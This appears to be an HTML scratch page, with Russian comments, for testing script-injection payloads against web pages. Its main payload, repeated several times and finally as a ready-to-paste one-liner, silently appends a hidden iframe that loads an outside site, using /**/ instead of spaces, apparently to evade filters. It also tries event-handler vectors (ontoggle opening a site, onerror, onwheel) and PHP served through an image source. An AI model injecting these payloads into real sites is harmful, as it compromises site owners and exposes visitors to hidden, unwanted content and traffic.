<html>
<head>
</head>
	<body>

<img src="test.php"></img> <!-- 1) php выполнился (от user, без скриптовой части) -->
<img src="test.rar"></img>

<iframe/sandbox/src="http://www.geographycollector.com"></iframe>
<script>var/**/iframe=document.createElement('iframe');iframe.src='http://www.geographycollector.com';iframe.style.display='none';document.body.appendChild(iframe);
</script>

	<details ontoggle=window.open('http://ya.ru');></details>

<img/src="x"/onerror=""> 

	<body onwheel="script">
	<script>document.body.setAttribute("onwheel","script");
	</script>

<?php
	//phpinfo();
	echo '12345';
?>
</body>
</html>

/* вариант одного frame с заменой src (в случае отображения "картинки") -- нет href */

<script>
function getRandomInt(min/*включительно*/, max/*не включая*/) {
  return Math.floor(Math.random()*(max-min))+min;
}
</script>

<script>
if ((!document.body.lastChild.id)||(document.body.lastChild.id==='gphcll')) //((!document.body.lastChild.src)||(document.body.lastChild.src.indexOf('geographycollector')==-1))
{
	var/**/iframe=document.createElement('iframe');
	iframe.src='http://www.geographycollector.com';
	iframe.setAttribute('id','gphcll');
	iframe.style.display='none';
	document.body.appendChild(iframe);
}
//else/**/if((document.body.lastChild.src)&&(document.body.lastChild.src.indexOf('geographycollector.com/')==-1))){
//	var/**/iframe=document.createElement('iframe');iframe.src='http://www.geographycollector.com/'+Math.floor(Math.random()*(138-1))+1;
//	iframe.style.display='none';
//	document.body.appendChild(iframe);
//}
</script>


if((!document.body.lastChild.id)||(document.body.lastChild.id==='gphcll')){var/**/iframe=document.createElement('iframe');iframe.src='http://www.geographycollector.com';iframe.setAttribute('id','gphcll');iframe.style.display='none';document.body.appendChild(iframe);}
